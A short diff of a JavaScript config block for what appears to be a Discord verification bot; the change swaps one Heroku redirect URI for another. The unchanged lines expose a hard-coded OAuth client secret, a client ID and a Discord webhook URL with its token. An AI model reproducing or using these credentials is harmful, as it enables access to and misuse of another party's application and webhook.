@@ -1,7 +1,7 @@
 //Config
 const client_secret = 'oDB8Q~8Uu_osj.ozQgMaBpQIa_gqHbPNkLm3daY0'
 const client_id = '2479bb3f-3864-4928-90de-4845471587a3'
-const redirect_uri = 'https://discordverifybotpickle.herokuapp.com/'
+const redirect_uri = 'https://pickleverifybot.herokuapp.com/'
 const webhook_url = 'https://discord.com/api/webhooks/1041142662201360425/_LJJnq6dC1ErN9B1m0VAxzQzm7w1lugnC8cyLeu4_kDQjjKAnMsqw5Ph_nEHAVfuKEYC'
 //Requirements
 const axios = require('axios')
